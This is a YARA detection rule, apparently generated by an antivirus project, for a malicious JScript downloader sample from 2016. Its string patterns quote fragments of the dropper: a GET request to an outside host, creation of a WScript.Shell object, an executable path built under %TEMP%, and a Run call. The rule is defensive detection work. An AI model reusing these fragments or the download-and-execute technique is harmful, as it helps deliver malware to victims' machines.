rule sig_20160401_1b3810e73b45c06a4dcd1379f1d9b8cc {
  meta:
    description = "datamaliciousorder - file 20160401_1b3810e73b45c06a4dcd1379f1d9b8cc.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "80bbd3757af3bc9914c14aed09f94b8148955599ad02db229da6953fd145b098"

  strings:
    $s1  = "JkDpx[JsKqg](\"G\" + \"ET\", \"http://xn--as-wqa.org.pl/s0olau\", false);" fullword ascii
    $s2  = "var FcdJtf = function DbKh() {return WScript[JokGtx](\"WScript\"+\".Shell\");}(), WlKsl = 11;" fullword ascii
    $s3  = "function LhfHmb(TqYmg, KhGwj){ChsGeq = ChsGeq * 1; return TqYmg - KhGwj;};" fullword ascii
    $s4  = "if (JkDpx[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function OtGxx() {return FcdJtf[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"Cyl3L6HuWx0.ex\" + \"e\";};" fullword ascii
    $s6  = "function KkTc(){return ImwYfi + \"\";};" fullword ascii
    $s7  = "function SaJkz() {return ((NiVw == true) && (NiVw == FwcXaw)) ? 1 : ChsGeq;};" fullword ascii
    $s8  = "function XgkFxo(){return 23;};" fullword ascii
    $s9  = "FwcXaw = true; " fullword ascii
    $s10 = "var PgkOy = false;" fullword ascii
    $s11 = "var NiVw = false;" fullword ascii
    $s12 = "NiVw = true; " fullword ascii
    $s13 = "}while (FmEnb);" fullword ascii
    $s14 = "function YchOob(PrcTis){FcdJtf[\"R\"+\"un\"](PrcTis, ChsGeq, ChsGeq);};" fullword ascii
    $s15 = "return LhfHmb(GbIp, QjAh);" fullword ascii
    $s16 = "function HfvGc(KkSz) {var GtgBbg = (1, 2, 3, 4, 5, KkSz); return GtgBbg;};" fullword ascii
    $s17 = "function EdTx(){return JokGtx;};" fullword ascii
    $s18 = "var FwcXaw = false;" fullword ascii
    $s19 = "function OsgWz()" fullword ascii
    $s20 = "var QgpCcg = new this[\"Date\"]();" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}